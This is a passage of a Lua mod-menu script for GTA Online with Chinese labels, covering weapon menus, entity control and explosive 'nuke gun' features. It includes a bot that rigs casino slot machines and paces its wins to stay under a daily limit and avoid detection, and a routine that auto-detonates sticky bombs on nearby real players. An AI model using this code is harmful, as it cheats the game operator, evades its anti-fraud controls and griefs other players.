                    end
                    --- livery equip actions
                    for livery_hash, label in liveries_dict do
                        if WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) and livery_actions[weapon_hash..livery_hash] == nil then
                            livery_actions[weapon_hash .. livery_hash] = cosmetics_list[weapon_hash]:action(util.get_label_text(label), {}, "",
                                    function()
                                        livery[weapon_hash] = livery_hash
                                        equip_comp(category, weapon_name, weapon_hash, livery_hash)
                                        WEAPON_SAVE_WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash], livery_colour_slider[weapon_hash].value)
                                    end
                            )
                        end
                    end
                end
            end
    )
end

function generate_attachments(category, weapon_name, weapon_hash)
    if weapon_deletes[weapon_name] == nil then
        weapon_deletes[weapon_name] = weapons_action[weapon_hash]:action("删去 " .. weapon_name, {}, "",
                function()
                    WEAPON_SAVE_WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(), weapon_hash)
                    cosmetics_list[weapon_hash]:delete()
                    cosmetics_list[weapon_hash] = nil
                    livery_action_divider[weapon_hash] = nil
                    weapons_action[weapon_hash]:delete()

                    util.toast(weapon_name .. " 已删除")
                    weapons_action[weapon_hash] = categories[category]:action(weapon_name .. " (未配备)", {}, "配备 " .. weapon_name,
                            function()
                                for a_key, _ in attachments_action do
                                    if string.find(a_key, weapon_hash) ~= nil then
                                        attachments_action[a_key] = nil
                                    end
                                end
                                menu.delete(weapons_action[weapon_hash])
                                equip_weapon(category, weapon_name, weapon_hash)
                                weapon_deletes[weapon_name] = nil
                            end
                    )
                    weapons_action[weapon_hash]:focus()
                end
        )
    end

    local has_attachments = false
    for livery_hash, _ in attachments_dict do
        if WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) then
            has_attachments = true
            break
        end
    end

    if cosmetics_list[weapon_hash] == nil then
        generate_cosmetics(weapon_hash, weapon_name)
        if has_attachments then
            weapons_action[weapon_hash]:divider("附件")
        end
    end

    for attachment_hash, attachment_label in attachments_dict do
        local attachment_name = util.get_label_text(attachment_label)
        if (WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, attachment_hash)) then
            if (attachments_action[weapon_hash .. " " .. attachment_hash] ~= nil) then attachments_action[weapon_hash .. " " .. attachment_hash]:delete() end
            attachments_action[weapon_hash .. " " .. attachment_hash] = weapons_action[weapon_hash]:action(attachment_name, {}, "配备 " .. attachment_name .. " 在您的 " .. weapon_name,
                    function()
                        equip_comp(category, weapon_name, weapon_hash, attachment_hash)
                        if (string.find(attachment_label, "弹夹") ~= nil or string.find(attachment_label, "炮弹") ~= nil) and WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(players.user_ped(), weapon_hash, attachment_hash) then
                            WEAPON_SAVE_WEAPON.ADD_AMMO_TO_PED(players.user_ped(), weapon_hash, 10)
                        end
                    end
            )
        end
    end
end


categories = {}
weapons_action = {}
attachments_action = {}
weapon_deletes = {}
cosmetics_list = {}
tints_slider = {}
livery_action_divider = {}
livery_actions = {}
livery_colour_slider = {}
livery = {}
function Weapon_Check_Save()
for _, weapon in weapons_table do
    local category = weapon.category
    if categories[category] == nil then
        categories[category] = custom_weapon_save:list(category, {}, "编辑的武器 " .. category .. " 类别")
    end
end
regen_menu()
end

proxyStickySettings = {players = true, npcs = false, radius = 2}
local function autoExplodeStickys(ped)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    if MISC.IS_PROJECTILE_TYPE_WITHIN_DISTANCE(pos.x, pos.y, pos.z, util.joaat('weapon_stickybomb'), proxyStickySettings.radius, true) then
        WEAPON.EXPLODE_PROJECTILES(players.user_ped(), util.joaat('weapon_stickybomb'))
    end
end

function proxyStickys()
    if proxyStickySettings.players then
        local specificWhitelistGroup = {user = false,  friends = whitelistGroups.friends, strangers = whitelistGroups.strangers}
        local playerList = getNonWhitelistedPlayers(whitelistListTable, specificWhitelistGroup, whitelistedName)
        for _, pid in pairs(playerList) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            autoExplodeStickys(ped)
        end
    end
    if proxyStickySettings.npcs then
        local pedHandles = entities.get_all_peds_as_handles()
        for _, ped in pairs(pedHandles) do
            if not PED.IS_PED_A_PLAYER(ped) then
                autoExplodeStickys(ped)
            end
        end
    end
end

function proxyStickys_players(toggle)
    proxyStickySettings.players = toggle
end

function proxystickys_npc(toggle)
    proxyStickySettings.npcs = toggle
end

function proxysticks_radius(value)
    proxyStickySettings.radius = value
end


function bulletchange()
    for id, data in pairs(weapon_stuff) do
        local name = data[1]
        local weapon_name = data[2]
        local a = false
        menu.toggle(weapon_thing, name, {}, "", function(toggle)
            a = toggle
            while a do
                local weapon = util.joaat(weapon_name)
                projectile = weapon
                while not WEAPON.HAS_WEAPON_ASSET_LOADED(projectile) do
                    WEAPON.REQUEST_WEAPON_ASSET(projectile, 31, false)
                    wait(10)
                end
                local inst = v3.new()
                if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                    if not WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), inst) then
                        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
                        local tmp = v3.toDir(inst)
                        v3.set(inst, v3.get(tmp))
                        v3.mul(inst, 1000)
                        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
                        v3.add(inst, tmp)
                        v3.free(tmp)
                    end
                    local x, y, z = v3.get(inst)
                    local wpEnt = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), false)
                    local wpCoords = ENTITY._GET_ENTITY_BONE_POSITION_2(wpEnt, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(wpEnt, "gun_muzzle"))
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(wpCoords.x, wpCoords.y, wpCoords.z, x, y, z, 1, true, weapon, PLAYER.PLAYER_PED_ID(), true, false, 1000)
                end
                wait()
            end
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 999999, 0)
        end)
    end
end

------- 实体控制枪 -------
function entity_control_all(menu_parent, ent)
    menu.action(menu_parent, "检测该实体是否存在", {}, "", function()
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            util.toast("实体存在")
        else
            util.toast("该实体已经不存在，请删除此条实体记录！")
        end
    end)
    menu.action(menu_parent, "删除此条实体记录", {}, "", function()
        menu.delete(menu_parent)
        clearTableValue(control_ent_menu_list, menu_parent)
        clearTableValue(control_ent_list, ent)
    end)
    --- ---
    menu.divider(menu_parent, "Entity")

    menu.toggle(menu_parent, "无敌", {}, "", function(toggle)
        ENTITY.SET_ENTITY_INVINCIBLE(ent, toggle)
        ENTITY.SET_ENTITY_PROOFS(ent, toggle, toggle, toggle, toggle, toggle, toggle, toggle, toggle)
    end)
    menu.toggle(menu_parent, "冻结", {}, "", function(toggle)
        ENTITY.FREEZE_ENTITY_POSITION(ent, toggle)
    end)
    --- ---
    menu.divider(menu_parent, "血量")
    menu.action(menu_parent, "获取当前血量", {}, "", function()
        util.toast("当前血量: " .. ENTITY.GET_ENTITY_HEALTH(ent))
    end)
    local control_ent_health = 1000
    menu.slider(menu_parent, "血量", { "control_ent_health" }, "", 0, 30000, 1000, 100, function(value)
        control_ent_health = value
    end)
    menu.action(menu_parent, "设置血量", {}, "", function()
        ENTITY.SET_ENTITY_HEALTH(ent, control_ent_health)
    end)
    --- ---
    menu.divider(menu_parent, "移动")
    menu.click_slider(menu_parent, "前/后移动", {}, "", -100, 100, 0, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, 0.0, value, 0.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.click_slider(menu_parent, "左/右移动", {}, "", -100, 100, 0, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, value, 0.0, 0.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.click_slider(menu_parent, "上/下移动", {}, "", -100, 100, 0, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, 0.0, 0.0, value)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.click_slider(menu_parent, "朝向", {}, "", -360, 360, 0, 10, function(value)
        local head = ENTITY.GET_ENTITY_HEADING(ent)
        ENTITY.SET_ENTITY_HEADING(ent, head + value)
    end)
    --- ---
    menu.divider(menu_parent, "传送")
    menu.click_slider(menu_parent, "传送到我面前", {}, "", -10, 10, 2, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, value, 0.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.toggle_loop(menu_parent, "锁定传送在我头上", {}, "", function()
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.0, 2.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.action(menu_parent, "离我的距离", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ent_pos = ENTITY.GET_ENTITY_COORDS(ent)
        util.toast(vect.dist(my_pos, ent_pos))
    end)

    menu.click_slider(menu_parent, "最大速度", { "control_ent_max_speed" }, "", 0.0, 1000.0, 30.0, 10.0, function(value)
        ENTITY.SET_ENTITY_MAX_SPEED(ent, value)
    end)

end

function IS_MPPLY(Stat)
    local Stats = {
        "MP_PLAYING_TIME",
        "MP_NGDLCPSTAT_INT0",
    }

    for i = 1, #Stats do
        if Stat == Stats[i] then
            return true
        end
    end

    if string.find(Stat, "MPPLY_") then
        return true
    else
        return false
    end
end

function ADD_MP_INDEX(Stat)
    if not IS_MPPLY(Stat) then
        Stat = "MP" .. util.get_char_slot() .. "_" .. Stat
    end
    return Stat
end

function STAT_GET_INT(Stat)
    local IntPTR = memory.alloc_int()
    STATS.STAT_GET_INT(util.joaat(ADD_MP_INDEX(Stat)), IntPTR, -1)
    return memory.read_int(IntPTR)
end

function get_chip_count()
    return STAT_GET_INT("CASINO_CHIPS")
end

function debug_log(message)
    if config.debug_mode then
        util.log("[SlotBot] "..message)
    end
end

function array_reverse(x)
    local n, m = #x, #x/2
    for i=1, m do
        x[i], x[n-i+1] = x[n-i+1], x[i]
    end
    return x
end

function press_button(button_id)
    for i = 1,10 do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, button_id, 1)
        wait()
    end
end

function format_large_number(number)
    local i, j, minus, int, fraction = tostring(number):find('([-]?)(%d+)([.]?%d*)')

    -- reverse the int-string and append a comma to all blocks of 3 digits
    int = int:reverse():gsub("(%d%d%d)", "%1,")

    -- reverse the int-string back remove an optional comma and put the
    -- optional minus and fractional part back
    return minus .. int:reverse():gsub("^,", "") .. fraction
end

function count_wins(spin_log)
    local num_wins = 0
    local target_time = util.current_time_millis() - config.millis_in_day
    for _, spin in pairs(spin_log) do
        if spin.is_rigged and spin.time > target_time then
            num_wins = num_wins + 1
        end
    end
    return num_wins
end

function calculate_daily_winnings(spin_log)
    local daily_winnings = 0
    local target_time = util.current_time_millis() - config.millis_in_day
    for _, spin in pairs(spin_log) do
        if spin.is_rigged and spin.time > target_time and spin.winnings ~= nil and spin.winnings > 0 then
            daily_winnings = daily_winnings + (spin.winnings or 0)
        end
    end
    return daily_winnings
end

function disp_time(time)
    --local days = math.floor(time/86400)
    local hours = math.floor((time % 86400)/3600)
    local minutes = math.floor((time % 3600)/60)
    --local seconds = math.floor(time % 60)
    return string.format("%d:%02d",hours,minutes)
end

function is_player_within_dimensions(dimensions, pid)
    if pid == nil then pid = players.user_ped() end
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_pos = ENTITY.GET_ENTITY_COORDS(target_ped)
    return (
            player_pos.x > dimensions.min.x and player_pos.x < dimensions.max.x
                    and player_pos.y > dimensions.min.y and player_pos.y < dimensions.max.y
                    and player_pos.z > dimensions.min.z and player_pos.z < dimensions.max.z
    )
end

function is_player_in_casino(pid)
    return is_player_within_dimensions({
        min={
            x=1073.9967,
            y=189.58717,
            z=-53.838943,
        },
        max={
            x=1166.935,
            y=284.88977,
            z=-42.28554,
        },
    }, pid)
end

function is_player_near_slot_machine(slot_machine_position, sensitivty)
    if sensitivty == nil then sensitivty = 1 end
    return is_player_within_dimensions({
        min={
            x=slot_machine_position.x - sensitivty,
            y=slot_machine_position.y - sensitivty,
            z=slot_machine_position.z - sensitivty,
        },
        max={
            x=slot_machine_position.x + sensitivty,
            y=slot_machine_position.y + sensitivty,
            z=slot_machine_position.z + sensitivty,
        },
    }, players.user())
end

function is_player_at_any_slot_machine()
    for _, slot_machine_position in pairs(slot_machine_positions) do
        if is_player_near_slot_machine(slot_machine_position.seated, 0.3) then
            return true
        end
    end
    return false
end

function load_spin_log()
    local file = io.open(SPIN_LOG_FILE)
    if not file then
        debug_log("Trying legacy spin log file")
        file = io.open(LEGACY_SPIN_LOG_FILE)
    end
    if file then
        local version = file:read()
        file:close()
        local spin_log_status, spin_log = pcall(soup.json.decode, version)
        if not spin_log_status then
            error("Could not decode spin log file")
        end
        return spin_log
    else
        return {}
    end
end

function log_spin(is_rigged, spin_winnings)
    debug_log("Logging spin")
    local spin_log = load_spin_log()
    local num_wins = count_wins(spin_log)
    if num_wins == 0 and #spin_log > 0 then spin_log = {} end
    table.insert(spin_log, {
        is_rigged=is_rigged,
        time=util.current_time_millis(),
        winnings=spin_winnings,
        log_time=os.date("%H:%M:%S")
    })
    save_spin_log(spin_log)
end

function get_daily_winnings()
    local spin_log = load_spin_log()
    return calculate_daily_winnings(spin_log)
end

function find_earliest_rigged_spin()
    local cutoff_time = util.current_time_millis() - config.millis_in_day
    local winnings = 0
    local spin_log = load_spin_log()
    for _, spin_log_item in pairs(array_reverse(spin_log)) do
        if spin_log_item.time > cutoff_time and spin_log_item.is_rigged then
            winnings = winnings + spin_log_item.winnings
            if winnings > config.max_daily_winnings then
                return spin_log_item
            end
        end
    end
end

function find_first_spin()
    local cutoff_time = util.current_time_millis() - config.millis_in_day
    local spin_log = load_spin_log()
    for _, spin_log_item in pairs(spin_log) do
        if spin_log_item.time > cutoff_time and spin_log_item.is_rigged then
            return spin_log_item
        end
    end
end

function get_safe_playtime()
    local first_spin = find_earliest_rigged_spin()
    if first_spin == nil then return "00:00" end
    local countdown = first_spin.time - util.current_time_millis() + config.millis_in_day
    if countdown > 0 then
        return disp_time(countdown / 1000)
    else
        return "00:00"
    end
end

function is_num_daily_wins_exceeded()
    return get_daily_winnings() >= config.max_daily_winnings
end

function switch_rigged_state()
    if state.is_rigged == nil or state.is_rigged == true then
        state.is_rigged = false
    else
        state.is_rigged = true
    end
end

function exit_slots()
    debug_log("Exiting slots")
    menu.trigger_commands("rigslotmachines off")
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 202, 1)
    wait(config.delay_between_button_press)
end

function is_slots_ready_for_spin()

    if not is_player_in_casino(players.user()) then
        util.toast("您必须在赌场中并坐在高支出的老虎机上才能启动自动旋转")
        exit_slots()
        return false
    end

    if not is_player_at_any_slot_machine() then
        util.toast("您必须坐在高支出老虎机（“钻石矿工”或“太阳的迪蒂”）上才能启动自动旋转")
        exit_slots()
        return false
    end

    if is_num_daily_wins_exceeded() then
        util.toast("您已经赢得了每日限额。在 "..get_safe_playtime())
        exit_slots()
        return false
    end

    return true
end

function spin_slots()

    if not is_slots_ready_for_spin() then
        debug_log("Slot machine not ready for spinning")
        return
    end

    switch_rigged_state()

    if state.is_rigged then
        debug_log("Setting slots to win")
        util.toast("Spinning slots to win")
        if config.test_mode then
            menu.trigger_command(commands.rigslotmachines, "smallwin")
        else
            menu.trigger_command(commands.rigslotmachines, "jackpot")
        end
        state.has_chips = true
    else
        debug_log("Setting slots to lose")
        util.toast("Spinning slots to lose")
        menu.trigger_command(commands.rigslotmachines, "loss")
    end
    wait(config.delay_between_button_press)

    local previous_chip_count = get_chip_count()

    -- Set Bet Amount
    debug_log("Setting bet amount")
    if state.is_rigged then
        --util.toast("Max bet")
        press_button(204)   -- TAB for Max Bet
    else
        --util.toast("Min bet")
        press_button(204)   -- TAB for Max Bet
        wait(config.delay_between_button_press * 2)
        press_button(203)   -- Space to cycle to lowest bet
    end
    wait(config.delay_between_button_press)

    -- Spin
    debug_log("Spinning slot")
    press_button(201)
    wait(config.delay_between_button_press)

    debug_log("Setting slots to unrigged")
    menu.trigger_command(commands.rigslotmachines, "off")

    wait(config.delay_between_spins - 500)

    local spin_winnings = get_chip_count() - previous_chip_count
    debug_log("Chip change "..tostring(spin_winnings))

    log_spin(state.is_rigged, spin_winnings)
    refresh_daily_winnings()
    refresh_next_spin_time()
end

function entity_control_ped(menu_parent, ped)
    menu.divider(menu_parent, "Ped")

    menu.action(menu_parent, "传送到我的载具", {}, "", function()
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
        if vehicle then
            if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(vehicle) then
                PED.SET_PED_INTO_VEHICLE(ped, vehicle, -2)
            end
        end
    end)

    menu.action(menu_parent, "移除全部武器", {}, "", function()
        WEAPON.REMOVE_ALL_PED_WEAPONS(ped)
    end)

  
    menu.action_slider(menu_parent, "给予武器", {}, "", weapon_list, function(value)
        local weaponHash = util.joaat(weapon_list_model[value])
        WEAPON.GIVE_WEAPON_TO_PED(ped, weaponHash, -1, false, true)
        WEAPON.SET_CURRENT_PED_WEAPON(ped, weaponHash, false)
    end)

    menu.action(menu_parent, "一键无敌强化NPC", {}, "适用于友方NPC", function()
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_PROOFS(ped, true, true, true, true, true, true, true, true)
        PED.SET_PED_CAN_RAGDOLL(ped, false)

        PED.SET_PED_HIGHLY_PERCEPTIVE(ped, true)
        PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(ped, 500.0)
        PED.SET_PED_SEEING_RANGE(ped, 500.0)
        PED.SET_PED_HEARING_RANGE(ped, 500.0)

        WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, true)
        PED.SET_PED_SHOOT_RATE(ped, 1000.0)
        PED.SET_PED_ACCURACY(ped, 100.0)
        PED.SET_PED_CAN_BE_SHOT_IN_VEHICLE(ped, true)

        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true) --AlwaysFight
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 12, true) --BlindFireWhenInCover
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 27, true) --PerfectAccuracy
        PED.SET_PED_COMBAT_MOVEMENT(ped, 2)
        PED.SET_PED_COMBAT_ABILITY(ped, 2)
        PED.SET_PED_COMBAT_RANGE(ped, 2)
        PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 1)
        PED.SET_COMBAT_FLOAT(ped, 10, 500.0)
        util.toast("Done")
    end)

end

--- VEHICLE entity type functions ---
function entity_control_vehicle(menu_parent, vehicle)
    menu.divider(menu_parent, "Vehicle")

    menu.action(menu_parent, "踢出载具内NPC", {}, "", function()
        local seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vehicle)
        for k = -1, seats do
            local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, k)
            if ped > 0 then
                PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(ped, KNOCKOFFVEHICLE_EASY)
                PED.KNOCK_PED_OFF_VEHICLE(ped)
            end
        end
    end)

    menu.action(menu_parent, "拆下车门", {}, "", function()
        for i = 0, 3 do
            VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehicle, i, false)
        end
    end)

    menu.toggle(menu_parent, "车门开关", {}, "", function(toggle)
        if toggle then
            for i = 0, 3 do
                VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle, i, false, false)
            end
        else
            VEHICLE.SET_VEHICLE_DOORS_SHUT(vehicle, false)
        end
    end)

    menu.toggle(menu_parent, "车门锁", {}, "", function(toggle)
        if toggle then
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 2)
        else
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(vehicle, players.user(), false)
        end
    end)

    menu.click_slider(menu_parent, "向前的速度", { "control_veh_forward_speed" }, "", 0.0, 1000.0, 30.0, 10.0, function(value)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, value)
    end)

    menu.action(menu_parent, "修复载具", {}, "", function()
        VEHICLE.SET_VEHICLE_FIXED(vehicle)
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000.0)
    end)
end

-- 所有控制的实体
control_ent_list = {}
-- 所有控制实体的menu.list
control_ent_menu_list = {}

--返回瞄准的实体
GetEntity_PlayerIsAimingAt = function(p)
    local ent = NULL
    if PLAYER.IS_PLAYER_FREE_AIMING(p) then
        local ptr = memory.alloc_int()
        if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(p, ptr) then
            ent = memory.read_int(ptr)
        end
        memory.free(ptr)
        if ENTITY.IS_ENTITY_A_PED(ent) and PED.IS_PED_IN_ANY_VEHICLE(ent) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(ent, false)
            ent = vehicle
        end
    end
    return ent
end

-- 遍历数组 判断某值是否在表中
function isInTable(tbl, value)
    for k, v in pairs(tbl) do
        if v == value then
            return true
        end
    end
    return false
end

-- 根据值清空对应的元素（非删除操作）
function clearTableValue(tbl, value)
    for k, v in pairs(tbl) do
        if v == value then
            tbl[k] = nil
        end
    end
end

---@return table
function newTableValue(pos, value)
    local tbl = {}
    tbl[pos] = value
    return tbl
end


function entitycontrol()
    local ent = GetEntity_PlayerIsAimingAt(players.user())
    if ent ~= NULL and ENTITY.DOES_ENTITY_EXIST(ent) then
        if not isInTable(control_ent_list, ent) then
            table.insert(control_ent_list, ent)
            ---
            local modelHash = ENTITY.GET_ENTITY_MODEL(ent)
            local entity_types = { "No entity", "Ped", "Vehicle", "Object" }
            local entity_type = entity_types[ENTITY.GET_ENTITY_TYPE(ent) + 1]
            if ENTITY.GET_ENTITY_TYPE(ent) == 3 then
                if OBJECT.IS_OBJECT_A_PICKUP(ent) or OBJECT.IS_OBJECT_A_PORTABLE_PICKUP(ent) then
                    entity_type = "Pickup"
                end
            end
            local entity_info = "Hash: " .. modelHash .. " (" .. entity_type .. ")"
            util.toast(entity_info)
            ---
            menu_control_entity = menu.list(entity_control, entity_info, {}, "")
            entity_control_all(menu_control_entity, ent)
            -- ped
            if ENTITY.GET_ENTITY_TYPE(ent) == 1 then
                entity_control_ped(menu_control_entity, ent)
            end
            -- vehicle
            if ENTITY.GET_ENTITY_TYPE(ent) == 2 then
                entity_control_vehicle(menu_control_entity, ent)
            end

            table.insert(control_ent_menu_list, menu_control_entity)
        end
    end
end

function clearcontrollog()
    for k, v in pairs(control_ent_menu_list) do
        if v ~= nil then
            menu.delete(v)
        end
    end
    -- 所有控制的实体
    control_ent_list = {}
    -- 所有控制实体的menu.list
    control_ent_menu_list = {}
end

-------  -------

local function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)

    return destination
end

local function raycast_gameplay_cam(distance)
    local result = {}
    local didHit = memory.alloc(1)
    local endCoords = v3()
    local surfaceNormal = v3()
    local hitEntity = memory.alloc_int()

    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)

    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)

    local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(cam_pos.x, cam_pos.y, cam_pos.z, destination.x, destination.y, destination.z, -1, players.user_ped(), 4)
    SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, memory.addrof(endCoords), memory.addrof(surfaceNormal), hitEntity)

    result.didHit = memory.read_byte(didHit) ~= 0
    result.endCoords = endCoords
    result.surfaceNormal = surfaceNormal
    result.hitEntity = memory.read_int(hitEntity)
    return result
end

local function direction(offset)
    local c1 = get_offset_from_gameplay_camera(offset or 5)
    local res = raycast_gameplay_cam(1000)
    local c2

    if res.didHit then
        c2 = res.endCoords
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end
    c2:sub(c1)
    c2:mul(1000)

    return c2, c1
end


local remove_projectiles = false
local function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end

local launcherThrowable = util.joaat('weapon_grenade')
local throwables_launcher
function throwablebullet(toggle)
    throwables_launcher = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1568386805 then --if holding grenade launcher
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1568386805)
                end
                util.create_thread(function()
                    local currentWeapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
                    local pos1 = ENTITY._GET_ENTITY_BONE_POSITION_2(currentWeapon, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(currentWeapon, 'gun_muzzle'))
                    local pos2 = get_offset_from_gameplay_camera(30)
                    if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), launcherThrowable, false) then
                        WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), launcherThrowable, 9999, false, false)
                    end
                    wait()
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, 200, true, launcherThrowable, players.user_ped(), true, false, 2000.0)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return throwables_launcher
    end)
end

--this function is from wiriScripts functions
    local function pairsByKeys(t, f)
        local a = {}
        for n in pairs(t) do table.insert(a, n) end
        table.sort(a, f)
        local i = 0
        local iter = function()
            i += 1
            if a[i] == nil then return nil
            else return a[i], t[a[i]]
            end
        end
        return iter
    end

function getLabelTableFromKeys(keyTable)
    local labelTable = {}
    for k, v in pairsByKeys(keyTable) do
        table.insert(labelTable, {k})
    end
    return labelTable
end

function bulletset(text)
    launcherThrowable = throwablesTable[text]
end


function menu.mutually_exclusive_toggle(root, name, commands, help, exclusive_toggles, func)
    local this_toggle
    this_toggle = menu.toggle(root, name, commands, help, function(toggle)
        if toggle then
            for _, ref in pairs(exclusive_toggles) do
                if ref != this_toggle and menu.get_value(ref) then
                    menu.set_value(ref, false)
                end
            end
        end
        func(toggle)
    end)
    return this_toggle
end

local function executeNuke(pos)
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)
        wait(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end

mutually_exclusive_weapons  = {}
local nuke_gun_option
function nukegunmode(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1074790547 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1074790547)
                end
                util.create_thread(function()
                    local hash = util.joaat('tr_prop_tr_military_pickup_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        wait()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end

local nuke_gun_option
function nukegunmode1(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1853920116 then 
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
